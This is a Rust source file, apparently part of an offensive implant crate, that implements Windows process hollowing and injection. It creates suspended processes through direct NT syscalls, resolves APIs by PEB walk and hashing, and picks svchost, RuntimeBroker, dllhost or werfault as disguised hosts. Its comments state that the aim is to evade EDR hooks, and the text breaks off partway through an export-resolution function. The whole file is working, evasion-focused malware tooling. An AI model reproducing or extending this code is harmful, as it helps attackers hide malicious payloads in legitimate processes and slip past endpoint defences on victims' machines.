use anyhow::{anyhow, Result};
#[cfg(not(windows))]
use std::ffi::c_void;
#[cfg(windows)]
use std::ffi::c_void;

/// Metadata for a successful injection into an existing target process.
pub struct InjectedProcess {
    /// PID that received the payload.
    pub target_pid: u32,
    /// Base address where the payload image or shellcode was mapped.
    pub remote_base: usize,
    /// Original payload size in bytes.
    pub payload_size: usize,
    /// Open process handle retained for callers that need cleanup/status.
    pub process_handle: *mut c_void,
    /// Open thread handle for the created execution thread, when retained.
    pub thread_handle: Option<*mut c_void>,
}

/// Dynamically-resolved GetLastError (reads TEB, no IAT entry).
#[cfg(windows)]
unsafe fn get_last_error() -> u32 {
    use std::sync::OnceLock;
    static GET_LAST_ERROR: OnceLock<Option<unsafe extern "system" fn() -> u32>> = OnceLock::new();
    let fn_ptr = GET_LAST_ERROR.get_or_init(|| {
        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
        let addr = pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"GetLastError\0"),
        )?;
        Some(std::mem::transmute(addr))
    });
    if let Some(func) = fn_ptr {
        func()
    } else {
        // Fallback: read TEB directly (x86_64 Windows)
        let teb: *mut u8;
        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
        std::ptr::read_volatile(teb.add(0x68) as *const u32)
    }
}

/// Section descriptor for `rva_to_file_offset_sections` — platform-agnostic
/// so the conversion logic can be unit-tested without `#[cfg(windows)]`.
#[cfg(any(windows, test))]
#[derive(Clone, Copy)]
struct SectionDesc {
    virtual_address: usize,
    virtual_size: usize,
    raw_offset: usize,
}

/// Walk a slice of `SectionDesc` entries and convert `rva` to a raw file offset.
///
/// Returns `rva` unchanged when no section contains it (header area, which maps
/// 1:1 for PE files with `SizeOfHeaders` bytes of header data).
#[cfg(any(windows, test))]
fn rva_to_file_offset_sections(rva: usize, sections: &[SectionDesc]) -> usize {
    for sec in sections {
        if rva >= sec.virtual_address && rva < sec.virtual_address + sec.virtual_size {
            return rva - sec.virtual_address + sec.raw_offset;
        }
    }
    // Fallback: header area (rva < SizeOfHeaders) maps 1:1.
    rva
}

#[cfg(any(windows, test))]
fn checked_payload_range(
    payload_len: usize,
    offset: usize,
    size: usize,
    what: &str,
) -> Result<std::ops::Range<usize>> {
    let end = offset
        .checked_add(size)
        .ok_or_else(|| anyhow!("hollow_and_execute: {what} offset range overflow"))?;
    if end > payload_len {
        return Err(anyhow!(
            "hollow_and_execute: PE too small for {what} (offset {offset:#x}, size {size:#x}, payload {} bytes)",
            payload_len
        ));
    }
    Ok(offset..end)
}

#[cfg(any(windows, test))]
fn checked_pe_lfanew(payload: &[u8]) -> Result<usize> {
    checked_payload_range(payload.len(), 0x3c, 4, "DOS e_lfanew")?;
    let raw = i32::from_le_bytes(payload[0x3c..0x40].try_into().unwrap());
    if raw < 0 {
        return Err(anyhow!(
            "hollow_and_execute: invalid negative e_lfanew ({raw})"
        ));
    }
    let offset = raw as usize;
    checked_payload_range(payload.len(), offset, 4, "NT signature")?;
    Ok(offset)
}

/// Convert a Relative Virtual Address (RVA) from the PE optional-header data
/// directories to a raw file offset by walking the section table.
///
/// The data-directory fields (e.g. `IMAGE_DIRECTORY_ENTRY_BASERELOC`,
/// `IMAGE_DIRECTORY_ENTRY_IMPORT`) store *virtual* addresses relative to the
/// image base, **not** offsets into the on-disk file.  Using an RVA directly
/// as a file offset is only accidentally correct for packed/aligned images
/// where `VirtualAddress == PointerToRawData`.  For general PE files the two
/// values differ and we must walk the section headers.
///
/// # Safety
///
/// `nt` must point to a valid, fully-mapped `IMAGE_NT_HEADERS64` structure.
/// The section headers immediately following it must also be valid and in-bounds.
#[cfg(windows)]
unsafe fn rva_to_file_offset(
    rva: usize,
    nt: *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64,
) -> usize {
    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first = (nt as usize
        + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64>())
        as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER;
    let descs: Vec<SectionDesc> = (0..num_sections)
        .map(|i| {
            let sec = &*first.add(i);
            SectionDesc {
                virtual_address: sec.VirtualAddress as usize,
                virtual_size: sec.Misc.VirtualSize as usize,
                raw_offset: sec.PointerToRawData as usize,
            }
        })
        .collect();
    rva_to_file_offset_sections(rva, &descs)
}

/// PE32 variant of `rva_to_file_offset` for WOW64 payload handling.
///
/// # Safety
///
/// `nt` must point to a valid, fully-mapped `IMAGE_NT_HEADERS32` structure.
/// The section headers immediately following it must also be valid and in-bounds.
#[cfg(windows)]
unsafe fn rva_to_file_offset32(
    rva: usize,
    nt: *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32,
) -> usize {
    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first = (nt as usize
        + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32>())
        as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER;
    let descs: Vec<SectionDesc> = (0..num_sections)
        .map(|i| {
            let sec = &*first.add(i);
            SectionDesc {
                virtual_address: sec.VirtualAddress as usize,
                virtual_size: sec.Misc.VirtualSize as usize,
                raw_offset: sec.PointerToRawData as usize,
            }
        })
        .collect();
    rva_to_file_offset_sections(rva, &descs)
}

// ─── NT API infrastructure ────────────────────────────────────────────────
//
// All cross-process operations (process/thread creation, memory allocation,
// read/write, context manipulation) are dispatched through NT functions
// resolved via PEB-walk (pe_resolve), so no IAT entries for kernel32/user32
// Win32 wrappers (CreateProcessA, VirtualAllocEx, WriteProcessMemory, etc.)
// are required.  EDR solutions commonly hook the IAT-visible Win32 entry
// points but cannot safely inline-hook every ntdll syscall stub.

/// NT UNICODE_STRING — not exposed by windows-sys.
#[cfg(windows)]
#[repr(C)]
struct UNICODE_STRING {
    Length: u16,
    MaximumLength: u16,
    Buffer: *mut u16,
}

/// NT OBJECT_ATTRIBUTES — required by NtOpenFile, NtCreateSection.
#[cfg(windows)]
#[repr(C)]
struct OBJECT_ATTRIBUTES {
    length: u32,
    root_directory: *mut c_void,
    object_name: *mut UNICODE_STRING,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

/// NT IO_STATUS_BLOCK — required by NtOpenFile.
#[cfg(windows)]
#[repr(C)]
struct IoStatusBlock {
    pointer: usize, // union: NTSTATUS / PVOID — only return value is checked
    information: usize,
}

// NT constants absent from the windows-sys features enabled for this crate.
#[cfg(windows)]
const NT_OBJ_CASE_INSENSITIVE: u32 = 0x40;
#[cfg(windows)]
const NT_FILE_READ_DATA: u32 = 0x0001;
#[cfg(windows)]
const NT_FILE_EXECUTE: u32 = 0x0020;
#[cfg(windows)]
const NT_SYNCHRONIZE: u32 = 0x0010_0000;
#[cfg(windows)]
const NT_FILE_SHARE_READ: u32 = 0x0001;
#[cfg(windows)]
const NT_FILE_SHARE_DELETE: u32 = 0x0004;
#[cfg(windows)]
const NT_FILE_SYNC_IO_NONALERT: u32 = 0x0000_0020;
#[cfg(windows)]
const NT_FILE_NON_DIRECTORY: u32 = 0x0000_0040;
#[cfg(windows)]
const NT_SECTION_ALL_ACCESS: u32 = 0x000F_001F;
#[cfg(windows)]
const NT_SEC_IMAGE: u32 = 0x0100_0000;
#[cfg(windows)]
const NT_PROCESS_ALL_ACCESS: u32 = 0x001F_FFFF;
/// Minimal thread access for injection: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
#[cfg(windows)]
const NT_THREAD_INJECT_ACCESS: u32 = 0x1A02;
/// THREAD_CREATE_FLAGS_CREATE_SUSPENDED
#[cfg(windows)]
const NT_THREAD_SUSPENDED: u32 = 0x0000_0001;
/// NtCurrentProcess() pseudo-handle (-1).
#[cfg(windows)]
const NT_CURRENT_PROCESS: usize = usize::MAX;
/// MEM_RELEASE for NtFreeVirtualMemory.
#[cfg(windows)]
const NT_MEM_RELEASE: u32 = 0x8000;

#[cfg(windows)]
unsafe fn nt_read_exact(
    hprocess: *mut c_void,
    remote_addr: usize,
    local_buf: *mut c_void,
    len: usize,
) -> bool {
    if remote_addr == 0 || local_buf.is_null() || len == 0 {
        return false;
    }
    let mut read = 0usize;
    let status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        hprocess as u64,
        remote_addr as u64,
        local_buf as u64,
        len as u64,
        &mut read as *mut _ as u64,
    )
    .unwrap_or(-1);
    status >= 0 && read == len
}

#[cfg(windows)]
unsafe fn nt_write_exact(
    hprocess: *mut c_void,
    remote_addr: usize,
    local_buf: *const c_void,
    len: usize,
) -> bool {
    if remote_addr == 0 || local_buf.is_null() || len == 0 {
        return false;
    }
    let mut written = 0usize;
    let status = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        hprocess as u64,
        remote_addr as u64,
        local_buf as u64,
        len as u64,
        &mut written as *mut _ as u64,
    )
    .unwrap_or(-1);
    status >= 0 && written == len
}

#[cfg(windows)]
unsafe fn remote_region_covers(
    hprocess: *mut c_void,
    remote_addr: usize,
    required_len: usize,
    require_writable: bool,
) -> bool {
    if remote_addr == 0 || required_len == 0 {
        return false;
    }

    let mut mbi: windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
    let mut ret_len: usize = 0;
    let status = nt_syscall::syscall!(
        "NtQueryVirtualMemory",
        hprocess as u64,
        remote_addr as u64,
        0u64, // MemoryBasicInformation
        &mut mbi as *mut _ as u64,
        std::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>() as u64,
        &mut ret_len as *mut _ as u64,
    )
    .unwrap_or(-1);

    if status < 0 {
        return false;
    }

    const MEM_COMMIT_STATE: u32 = 0x1000;
    const PAGE_NOACCESS_PROT: u32 = 0x01;
    const PAGE_READWRITE_PROT: u32 = 0x04;
    const PAGE_WRITECOPY_PROT: u32 = 0x08;
    const PAGE_EXECUTE_READWRITE_PROT: u32 = 0x40;
    const PAGE_EXECUTE_WRITECOPY_PROT: u32 = 0x80;

    if (mbi.State as u32) != MEM_COMMIT_STATE {
        return false;
    }

    let region_base = mbi.BaseAddress as usize;
    let region_end = region_base.saturating_add(mbi.RegionSize);
    let requested_end = remote_addr.saturating_add(required_len);
    if requested_end > region_end {
        return false;
    }

    let protect = (mbi.Protect as u32) & 0xFF;
    if protect == PAGE_NOACCESS_PROT {
        return false;
    }
    if require_writable {
        let writable = matches!(
            protect,
            PAGE_READWRITE_PROT
                | PAGE_WRITECOPY_PROT
                | PAGE_EXECUTE_READWRITE_PROT
                | PAGE_EXECUTE_WRITECOPY_PROT
        );
        if !writable {
            return false;
        }
    }

    true
}

/// Resolve a function from the loaded `ntdll.dll` via PEB-walk.
#[cfg(windows)]
#[inline]
unsafe fn resolve_nt(name: &[u8]) -> Option<usize> {
    let base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))?;
    pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(name))
}

/// Convert a Win32 DOS path to a `\??\`-prefixed NT namespace path as a
/// null-terminated wide string.
#[cfg(windows)]
fn dos_to_nt_path(dos_path: &str) -> Vec<u16> {
    format!("\\??\\{}", dos_path)
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect()
}

/// Return a prioritised list of host-process paths to try for hollowing.
/// Using a list avoids hard failures on hardened environments where
/// `svchost.exe` has been moved or renamed.
#[cfg(windows)]
fn host_candidate_paths() -> Vec<String> {
    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    vec![
        format!(r"{}\System32\svchost.exe", sysroot),
        format!(r"{}\System32\RuntimeBroker.exe", sysroot),
        format!(r"{}\System32\dllhost.exe", sysroot),
        format!(r"{}\System32\werfault.exe", sysroot),
    ]
}

/// Create a new suspended process from `exe_path` using NT direct syscalls:
///   NtOpenFile → NtCreateSection(SEC_IMAGE) → NtCreateProcessEx → NtCreateThreadEx
///
/// All NT functions are dispatched through `nt_syscall::syscall!` (SSN resolved
/// via Halo's Gate or clean-ntdll mapping) so no hooked IAT entries are needed.
///
/// Returns `(hProcess, hThread)`.  The caller must close both handles.
#[cfg(windows)]
unsafe fn create_suspended_process_nt(exe_path: &str) -> Result<(*mut c_void, *mut c_void)> {
    // Build NT namespace path and UNICODE_STRING.
    let mut path_wide = dos_to_nt_path(exe_path);
    let byte_len = ((path_wide.len() - 1) * 2) as u16;
    let mut ustr = UNICODE_STRING {
        Length: byte_len,
        MaximumLength: byte_len + 2,
        Buffer: path_wide.as_mut_ptr(),
    };
    let mut oa = OBJECT_ATTRIBUTES {
        length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        root_directory: std::ptr::null_mut(),
        object_name: &mut ustr,
        attributes: NT_OBJ_CASE_INSENSITIVE,
        security_descriptor: std::ptr::null_mut(),
        security_quality_of_service: std::ptr::null_mut(),
    };
    let mut isb = IoStatusBlock {
        pointer: 0,
        information: 0,
    };

    let mut h_file: *mut c_void = std::ptr::null_mut();
    let s = nt_syscall::syscall!(
        "NtOpenFile",
        &mut h_file as *mut _ as u64,
        (NT_FILE_READ_DATA | NT_FILE_EXECUTE | NT_SYNCHRONIZE) as u64,
        &mut oa as *mut _ as u64,
        &mut isb as *mut _ as u64,
        (NT_FILE_SHARE_READ | NT_FILE_SHARE_DELETE) as u64,
        (NT_FILE_SYNC_IO_NONALERT | NT_FILE_NON_DIRECTORY) as u64,
    )
    .map_err(|e| anyhow!("NtOpenFile SSN: {e}"))?;
    if s < 0 || h_file.is_null() {
        return Err(anyhow!(
            "NtOpenFile({}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    let mut h_section: *mut c_void = std::ptr::null_mut();
    let s = nt_syscall::syscall!(
        "NtCreateSection",
        &mut h_section as *mut _ as u64,
        NT_SECTION_ALL_ACCESS as u64,
        0u64,
        0u64,
        windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ as u64,
        NT_SEC_IMAGE as u64,
        h_file as u64,
    )
    .map_err(|e| anyhow!("NtCreateSection SSN: {e}"))?;
    // Close file handle regardless of section creation result.
    let _ = nt_syscall::syscall!("NtClose", h_file as u64);
    if s < 0 || h_section.is_null() {
        return Err(anyhow!(
            "NtCreateSection({}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    let mut h_process: *mut c_void = std::ptr::null_mut();
    let s = nt_syscall::syscall!(
        "NtCreateProcessEx",
        &mut h_process as *mut _ as u64,
        NT_PROCESS_ALL_ACCESS as u64,
        0u64,
        NT_CURRENT_PROCESS as u64,
        0u64,
        h_section as u64,
        0u64,
        0u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtCreateProcessEx SSN: {e}"))?;
    let _ = nt_syscall::syscall!("NtClose", h_section as u64);
    if s < 0 || h_process.is_null() {
        return Err(anyhow!(
            "NtCreateProcessEx({}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    // Resolve a suitable thread start routine inside ntdll.
    let start_addr = resolve_nt(b"RtlUserThreadStart\0")
        .or_else(|| resolve_nt(b"LdrInitializeThunk\0"))
        .ok_or_else(|| anyhow!("RtlUserThreadStart not found in ntdll"))?;

    let mut h_thread: *mut c_void = std::ptr::null_mut();
    let s = nt_syscall::syscall!(
        "NtCreateThreadEx",
        &mut h_thread as *mut _ as u64,
        NT_THREAD_INJECT_ACCESS as u64,
        0u64,
        h_process as u64,
        start_addr as u64,
        0u64,
        NT_THREAD_SUSPENDED as u64,
        0u64,
        0u64,
        0u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtCreateThreadEx SSN: {e}"))?;
    if s < 0 || h_thread.is_null() {
        let _ = nt_syscall::syscall!("NtTerminateProcess", h_process as u64, 1u64);
        let _ = nt_syscall::syscall!("NtClose", h_process as u64);
        return Err(anyhow!(
            "NtCreateThreadEx({}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    Ok((h_process, h_thread))
}

/// Create a suspended process using CreateProcessW resolved via PEB-walk.
///
/// This path is more robust than raw NtCreateProcessEx startup because the
/// Windows process manager performs full user-mode process initialization.
#[cfg(windows)]
unsafe fn create_suspended_process_win32(exe_path: &str) -> Result<(*mut c_void, *mut c_void)> {
    use std::sync::OnceLock;

    type FnCreateProcessW = unsafe extern "system" fn(
        *const u16,
        *mut u16,
        *mut c_void,
        *mut c_void,
        i32,
        u32,
        *mut c_void,
        *const u16,
        *const c_void,
        *mut c_void,
    ) -> i32;

    static CREATE_PROCESS_W: OnceLock<Option<FnCreateProcessW>> = OnceLock::new();
    let fn_ptr = CREATE_PROCESS_W.get_or_init(|| {
        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
        let addr = pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"CreateProcessW\0"),
        )?;
        Some(std::mem::transmute(addr))
    });
    let create_process = fn_ptr.ok_or_else(|| {
        anyhow!("create_suspended_process_win32: CreateProcessW not found via PEB-walk")
    })?;

    let mut exe_wide: Vec<u16> = exe_path.encode_utf16().chain(std::iter::once(0)).collect();

    #[repr(C)]
    struct StartupInfoW {
        cb: u32,
        lp_reserved: *mut c_void,
        lp_desktop: *mut c_void,
        lp_title: *mut c_void,
        dw_x: u32,
        dw_y: u32,
        dw_x_size: u32,
        dw_y_size: u32,
        dw_x_count_chars: u32,
        dw_y_count_chars: u32,
        dw_fill_attribute: u32,
        dw_flags: u32,
        w_show_window: u16,
        cb_reserved2: u16,
        lp_reserved2: *mut u8,
        h_std_input: *mut c_void,
        h_std_output: *mut c_void,
        h_std_error: *mut c_void,
    }

    #[repr(C)]
    struct ProcessInformation {
        h_process: *mut c_void,
        h_thread: *mut c_void,
        dw_process_id: u32,
        dw_thread_id: u32,
    }

    const CREATE_SUSPENDED: u32 = 0x0000_0004;

    let mut si = std::mem::zeroed::<StartupInfoW>();
    si.cb = std::mem::size_of::<StartupInfoW>() as u32;
    let mut pi = std::mem::zeroed::<ProcessInformation>();

    let ok = create_process(
        exe_wide.as_ptr(),
        exe_wide.as_mut_ptr(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        0,
        CREATE_SUSPENDED,
        std::ptr::null_mut(),
        std::ptr::null(),
        &si as *const _ as *const c_void,
        &mut pi as *mut _ as *mut c_void,
    );

    if ok == 0 {
        let err = get_last_error();
        return Err(anyhow!(
            "create_suspended_process_win32: CreateProcessW({}) failed with GetLastError={}",
            exe_path,
            err
        ));
    }

    if pi.h_process.is_null() || pi.h_thread.is_null() {
        return Err(anyhow!(
            "create_suspended_process_win32: CreateProcessW returned NULL handles for {}",
            exe_path
        ));
    }

    Ok((pi.h_process, pi.h_thread))
}

/// Create a suspended **WOW64 (32-bit)** child process.
///
/// `NtCreateProcessEx` with `NT_CURRENT_PROCESS` always creates a child of
/// the same bitness as the caller (64-bit).  For PE32 process hollowing we
/// need a 32-bit host.  This function resolves `CreateProcessW` from
/// kernel32 via PEB-walk (no IAT hook) and uses `CREATE_SUSPENDED` so the
/// process is frozen before any entry point runs.
///
/// Returns `(hProcess, hThread)`.  The caller must close both handles.
#[cfg(windows)]
unsafe fn create_suspended_wow64_process(exe_path: &str) -> Result<(*mut c_void, *mut c_void)> {
    create_suspended_process_win32(exe_path)
}

/// M-26 Part E: load a DLL into our own process via `LdrLoadDll` (resolved via
/// PEB walk) instead of the hookable `LoadLibraryA` IAT entry. Returns 0 on
/// failure, in which case the caller leaves the corresponding IAT slot empty.
#[cfg(windows)]
unsafe fn ldr_load_local(dll_name: &str) -> usize {
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")) {
        Some(b) => b,
        None => return 0,
    };
    let ldr_addr =
        match pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"LdrLoadDll\0")) {
            Some(a) => a,
            None => return 0,
        };
    type LdrLoadDllFn = unsafe extern "system" fn(
        *mut u16,
        *mut u32,
        *mut UNICODE_STRING,
        *mut *mut std::ffi::c_void,
    ) -> i32;
    let ldr_load_dll: LdrLoadDllFn = std::mem::transmute(ldr_addr as *const ());

    let wide: Vec<u16> = dll_name.encode_utf16().chain(std::iter::once(0)).collect();
    let mut us: UNICODE_STRING = std::mem::zeroed();
    us.Length = ((wide.len().saturating_sub(1)) * 2) as u16;
    us.MaximumLength = (wide.len() * 2) as u16;
    us.Buffer = wide.as_ptr() as *mut _;
    let mut base_out: *mut std::ffi::c_void = std::ptr::null_mut();
    let status = ldr_load_dll(
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        &mut us,
        &mut base_out,
    );
    if status >= 0 {
        base_out as usize
    } else {
        0
    }
}

/// Return the export-directory tuple for a PE image regardless of bitness.
///
/// Returns `(export_rva, export_size, export_dir_ptr)` on success.
#[cfg(windows)]
unsafe fn local_get_export_directory(
    base: usize,
) -> Option<(
    u32,
    usize,
    *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY,
)> {
    let dos_header = base as *const windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_base = base + (*dos_header).e_lfanew as usize;
    if *(nt_base as *const u32) != windows_sys::Win32::System::SystemServices::IMAGE_NT_SIGNATURE {
        return None;
    }

    let opt_magic = *((nt_base
        + 4
        + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>())
        as *const u16);

    let export_data_dir = match opt_magic {
        windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
            let nt_headers32 = nt_base
                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
            (*nt_headers32).OptionalHeader.DataDirectory
                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_EXPORT
                    as usize]
        }
        windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
            let nt_headers64 = nt_base
                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
            (*nt_headers64).OptionalHeader.DataDirectory
                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_EXPORT
                    as usize]
        }
        _ => return None,
    };

    if export_data_dir.VirtualAddress == 0 {
        return None;
    }

    let ed = (base + export_data_dir.VirtualAddress as usize)
        as *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY;
    Some((
        export_data_dir.VirtualAddress,
        export_data_dir.Size as usize,
        ed,
    ))
}

/// M-26 Part E: resolve an export by ordinal from a clean module image.
/// Mirrors `agent::syscalls::get_export_addr_by_ordinal` so the hollowing
/// crate doesn't need to depend on agent or call hooked GetProcAddress.
#[cfg(windows)]
unsafe fn local_get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut std::ffi::c_void {
    use std::ffi::CStr;

    let dos_header = base as *const windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
        return std::ptr::null_mut();
    }

    let (export_dir_rva, export_dir_size, ed) = match local_get_export_directory(base) {
        Some(v) => v,
        None => return std::ptr::null_mut(),
    };

    let base_ordinal = (*ed).Base;
    let num_funcs = (*ed).NumberOfFunctions;
    let funcs = (base + (*ed).AddressOfFunctions as usize) as *const u32;
    if ordinal < base_ordinal {
        return std::ptr::null_mut();
    }
    let idx = (ordinal - base_ordinal) as usize;
    if idx >= num_funcs as usize {
        return std::ptr::null_mut();
    }
    let func_rva = *funcs.add(idx) as usize;
    if func_rva == 0 {
        return std::ptr::null_mut();
    }

    // Forwarder: RVA points inside export directory, so it is an ASCII
    // "DLL.Func" string rather than executable code.
    let export_start = export_dir_rva as usize;
    let export_end = export_start.saturating_add(export_dir_size);
    if func_rva >= export_start && func_rva < export_end {
        let forward_ptr = (base + func_rva) as *const i8;
        let forward = match CStr::from_ptr(forward_ptr).to_str() {
            Ok(s) => s,
            Err(_) => return std::ptr::null_mut(),
        };

        let (dll_part, symbol_part) = match forward.find('.') {
            Some(i) => (&forward[..i], &forward[i + 1..]),
            None => return std::ptr::null_mut(),
        };

        let dll_name = if dll_part.to_ascii_lowercase().ends_with(".dll") {
            dll_part.to_string()
        } else {
            format!("{}.dll", dll_part)
        };

        // Load forwarded target via ntdll!LdrLoadDll to avoid hookable
        // LoadLibraryA/GetProcAddress IAT paths.
        let loaded_base = ldr_load_local(&dll_name);
        if loaded_base == 0 {
            return std::ptr::null_mut();
        }

        let mut dll_name_nul = dll_name.as_bytes().to_vec();
        dll_name_nul.push(0);
        let dll_hash = pe_resolve::hash_str(&dll_name_nul);
        let hmod = pe_resolve::get_module_handle_by_hash(dll_hash).unwrap_or(loaded_base);
        if hmod == 0 {
            return std::ptr::null_mut();
        }

        if let Some(ord_str) = symbol_part.strip_prefix('#') {
            let ord = match ord_str.parse::<u16>() {
                Ok(v) => v,
                Err(_) => return std::ptr::null_mut(),
            };
            return local_get_export_addr_by_ordinal(hmod, ord as u32);
        }

        let mut symbol_nul = symbol_part.as_bytes().to_vec();
        symbol_nul.push(0);
        let symbol_hash = pe_resolve::hash_str(&symbol_nul);
        return pe_resolve::get_proc_address_by_hash(hmod, symbol_hash)
            .map(|a| a as *mut std::ffi::c_void)
            .unwrap_or(std::ptr::null_mut());
    }

    (base + func_rva) as *mut std::ffi::c_void
}

/// Normalize a DLL name for cache keys and hash lookups.
///
/// Produces lowercase names and ensures a `.dll` suffix is present.
#[cfg(windows)]
fn normalize_dll_name(name: &str) -> String {
    let lower = name.to_ascii_lowercase();
    if lower.ends_with(".dll") {
        lower
    } else {
        format!("{}.dll", lower)
    }
}

/// Ensure a module is loaded locally and cache its base by normalized name.
#[cfg(windows)]
unsafe fn ensure_local_module_loaded_cached(
    local_modules: &mut std::collections::HashMap<String, usize>,
    dll_name: &str,
) -> Option<usize> {
    let key = normalize_dll_name(dll_name);
    if let Some(&base) = local_modules.get(&key) {
        return Some(base);
    }

    let mut key_nul = key.as_bytes().to_vec();
    key_nul.push(0);
    let hash = pe_resolve::hash_str(&key_nul);
    let base = pe_resolve::get_module_handle_by_hash(hash).or_else(|| {
        let h = ldr_load_local(&key);
        if h == 0 {
            None
        } else {
            Some(h)
        }
    })?;

    local_modules.insert(key, base);
    Some(base)
}

#[cfg(windows)]
const MAX_EXPORT_FORWARD_DEPTH: u32 = 8;

#[cfg(windows)]
unsafe fn local_resolve_export_target_from_rva(
    module_name: &str,
    module_base: usize,
    func_rva: usize,
    export_dir_rva: u32,
    export_dir_size: usize,
    local_modules: &mut std::collections::HashMap<String, usize>,
    depth: u32,
) -> Option<(String, usize, usize)> {
    use std::ffi::CStr;

    if depth >= MAX_EXPORT_FORWARD_DEPTH {
        return None;
    }
    if func_rva == 0 {
        return None;
    }

    // Forwarder: RVA points into the export directory and contains an
    // ASCII "DLL.Func" or "DLL.#Ordinal" string.
    let export_start = export_dir_rva as usize;
    let export_end = export_start.saturating_add(export_dir_size);
    if func_rva >= export_start && func_rva < export_end {
        let forward_ptr = (module_base + func_rva) as *const i8;
        let forward = CStr::from_ptr(forward_ptr).to_str().ok()?;

        let dot = forward.find('.')?;
        let dll_part = &forward[..dot];
        let symbol_part = &forward[dot + 1..];

        let forwarded_module = normalize_dll_name(dll_part);
        let forwarded_base = ensure_local_module_loaded_cached(local_modules, &forwarded_module)?;

        if let Some(ord_str) = symbol_part.strip_prefix('#') {
            let ord = ord_str.parse::<u16>().ok()?;
            return local_resolve_export_target_by_ordinal(
                &forwarded_module,
                forwarded_base,
                ord as u32,
                local_modules,
                depth + 1,
            );
        }

        let mut symbol_nul = symbol_part.as_bytes().to_vec();
        symbol_nul.push(0);
        let symbol_hash = pe_resolve::hash_str(&symbol_nul);
        return local_resolve_export_target_by_hash(
            &forwarded_module,
            forwarded_base,
            symbol_hash,
            local_modules,
            depth + 1,
        );
    }

    Some((normalize_dll_name(module_name), module_base, func_rva))
}

/// Resolve an export by ordinal and return the owning module and export RVA.
///
/// The returned tuple is `(module_name, module_base, export_rva)` where
/// `module_name` may differ from the input when a forwarder chain is followed.
#[cfg(windows)]
unsafe fn local_resolve_export_target_by_ordinal(
    module_name: &str,
    module_base: usize,
    ordinal: u32,
    local_modules: &mut std::collections::HashMap<String, usize>,
    depth: u32,
) -> Option<(String, usize, usize)> {
    let (export_dir_rva, export_dir_size, ed) = local_get_export_directory(module_base)?;

    let base_ordinal = (*ed).Base;
    let num_funcs = (*ed).NumberOfFunctions;
    if ordinal < base_ordinal {
        return None;
    }
    let idx = (ordinal - base_ordinal) as usize;
    if idx >= num_funcs as usize {
        return None;
    }

    let funcs = (module_base + (*ed).AddressOfFunctions as usize) as *const u32;
    let func_rva = *funcs.add(idx) as usize;

    local_resolve_export_target_from_rva(
        module_name,
        module_base,
        func_rva,
        export_dir_rva,
        export_dir_size,
        local_modules,
        depth,
    )
}

/// Resolve an export by name hash and return the owning module and export RVA.
///
/// The returned tuple is `(module_name, module_base, export_rva)` where
/// `module_name` may differ from the input when a forwarder chain is followed.
#[cfg(windows)]
unsafe fn local_resolve_export_target_by_hash(
    module_name: &str,
    module_base: usize,
    target_hash: u32,
    local_modules: &mut std::collections::HashMap<String, usize>,
    depth: u32,
) -> Option<(String, usize, usize)> {
    use std::ffi::CStr;

    let (export_dir_rva, export_dir_size, ed) = local_get_export_directory(module_base)?;
